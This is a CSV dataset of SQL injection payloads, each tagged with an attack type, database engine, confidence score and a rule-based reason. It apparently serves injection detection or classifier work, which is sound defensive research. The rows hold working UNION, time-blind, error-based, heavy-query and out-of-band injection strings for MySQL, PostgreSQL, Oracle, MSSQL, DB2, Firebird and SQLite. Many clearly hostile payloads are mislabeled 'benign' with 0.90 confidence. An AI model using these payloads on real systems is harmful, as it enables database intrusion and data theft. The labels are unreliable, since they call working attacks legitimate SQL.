id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25156,"1' ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'onmp' = 'onmp",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25157,"-7248"" ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""qgms"" = ""qgms",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25158,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25159,"-7234"" ) union all select 3154,3154,3154,3154#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25160,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) --",unknown,generic,0.50,Insufficient information to classify,1
25161,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25162,-8521'+ ( select ucim where 9003 = 9003 union all select 9003--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25163,"1"" ) ) order by 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25164,"1"" ) where 9656 = 9656 and sleep ( 5 ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25165,"-2500' ) ) ) union all select 6853,6853,6853,6853--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25166,"1'+ ( select 'wkbg' where 3921 = 3921 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25167,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'glfq' like 'glfq,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25168,"-8353' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'ptlz' = 'ptlz",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
25169,"1%"" ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25170,-2817%' ) or 8255 = 3841--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25171,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25172,"iif ( 7036 = 2370,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
25173,select sleep ( 5 ) and ( 'pwpc' = 'pwpc,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25174,"-6457 where 1764 = 1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25175,"-5054%"" ) ) ) union all select 8263,8263,8263,8263--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25176,"1%"" ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""%"" = """,error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25177,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'fwok' like 'fwok",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25178,"-7395%"" order by 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25179,"1"" where 9241 = 9241 union all select null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25180,"1"" where 8483 = 8483 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25181,"1'+ ( select 'sacd' where 5984 = 5984 union all select null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25182,"1' ) where 6248 = 6248 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25183,"1"" ) ) as fmul where 7827 = 7827",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25184,"-8258"" ) ) as swjp where 2681 = 2681 union all select 2681,2681,2681,2681,2681,2681--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25185,-4518 where 8023 = 8023 or 6872 = 6872--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25186,"1' ) as gxpb where 7107 = 7107 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25187,"-8355%"" ) ) ) union all select 3004,3004,3004,3004,3004,3004,3004--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25188,"1'+ ( select tnch where 1867 = 1867 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25189,"-3924'|| ( select 'ssld' from dual where 6229 = 6229 union all select 6229,6229,6229,6229,6229#",union_based,oracle,0.75,Signal match: union (all )?select → union_based (P7),1
25190,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'fgcg' = 'fgcg",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25191,"-5830 ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25192,"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""azmf"" = ""azmf",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25193,"1%' ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25194,"1"" ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ""xhqc"" = ""xhqc",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25195,"1' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 'rbhe' = 'rbhe",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25196,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25197,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'vunt' = 'vunt",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25198,"1' ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'bmbt' = 'bmbt",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25199,"1 ) as iovi where 3910 = 3910 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25200,"1"" ) where 4182 = 4182 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25201,"-8065"" ) ) ) order by 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25202,"1%"" ) ) ) order by 1#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25203,"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 1185 = 1185",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25204,1' ) as znak where 5203 = 5203,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25205,-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25206,"1 ) ) as qgok where 3993 = 3993 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25207,"1"" ) ) waitfor delay '0:0:5' and ( ( ""koni"" like ""koni",time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25208,"-1748%"" ) ) ) union all select 2987#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25209,"1 ) ) as jzzo where 7773 = 7773 union all select null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25210,"-8344 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- wjpa",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25211,"1%"" ) ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25212,"1 ) where 3738 = 3738 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25213,"select * from generate_series ( 6414,6414,case when ( 6414 = 6455 ) then 1 else 0 end ) limit 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25214,"1"" ) ) as spvl where 2242 = 2242 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25215,"1 ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 4557 = 4557",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25216,"1%"" ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25217,1'+ ( select bjav where 6923 = 6923 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25218,"-8633"" or 5099 = 5974",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25219,end and 'hizd' = 'hizd,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25220,"1"" and ( 1668 = 8054 ) *8054",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25221,-1643' where 1968 = 1968 or 3484 = 6642,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25222,"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'gxgi' = 'gxgi",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25223,"1"" where 5236 = 5236 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25224,"1'|| ( select 'yags' where 6268 = 6268 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) ||'",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25225,"1"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""qpzj"" like ""qpzj",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25226,"1' ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25227,"1 where 9898 = 9898 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25228,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 'vcgc' like 'vcgc",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25229,"1"" ) where 2070 = 2070",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25230,"-9142%"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25231,"1"" and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25232,"-8933 ) as iiyr where 1974 = 1974 union all select 1974,1974,1974,1974,1974#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25233,1' ) as gdie where 8133 = 8133 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25234,1'|| ( select 'puco' where 2605 = 2605 union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25235,"1%"" ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""%"" = """,heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25236,"1"" or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25237,1' ) rlike ( select ( case when ( 2671 = 4485 ) then 1 else 0x28 end ) ) and ( 'ezco' like 'ezco,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25238,"1'+ ( select uqdb where 3508 = 3508 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25239,"-3437 ) union all select 7774,7774,7774--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25240,select ( case when ( 2914 = 3335 ) then 2914 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25241,-6341' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'ugys' = 'ugys,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25242,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ""nwjv"" = ""nwjv",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25243,"1"" where 7249 = 7249 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25244,"-1097"" where 4421 = 4421 union all select 4421,4421,4421,4421,4421#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25245,"1%"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""%"" = """,time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25246,-8274' ) ) union all select 3048--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25247,-6203' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'luee' = 'luee,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25248,"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'nazb' = 'nazb",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25249,"1' ) where 8835 = 8835 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25250,"-5581%' ) ) ) union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25251,select sleep ( 5 ) and 'mlmu' = 'mlmu,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25252,"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'jmub' = 'jmub",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25253,"-3960"" ) ) union all select 7813,7813,7813,7813,7813,7813--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25254,"1 ) where 6082 = 6082 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25255,"-7793"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""lias"" = ""lias",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25256,"1' where 6853 = 6853 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25257,"1%"" ) )",unknown,generic,0.50,Insufficient information to classify,1
25258,1'+ ( select 'yyyn' where 5395 = 5395,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25259,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'sgdj' like 'sgdj,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25260,"1%"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25261,"-3359 union all select 4675,4675,4675--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25262,"1"" ) where 9545 = 9545 and 9198 = 9198--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25263,"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'luoj' = 'luoj",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25264,"-9263' ) as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
25265,-1011 or 7140 = 9977--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25266,select ( case when ( 3539 = 8768 ) then 3539 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25267,"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'hfxu' like 'hfxu",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25268,1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) # pkcp,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25269,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'yctp' = 'yctp,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25270,"1"" ) where 2388 = 2388 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25271,"1"" ) union all select null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25272,"1"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""tepf"" = ""tepf",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25273,"1' union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
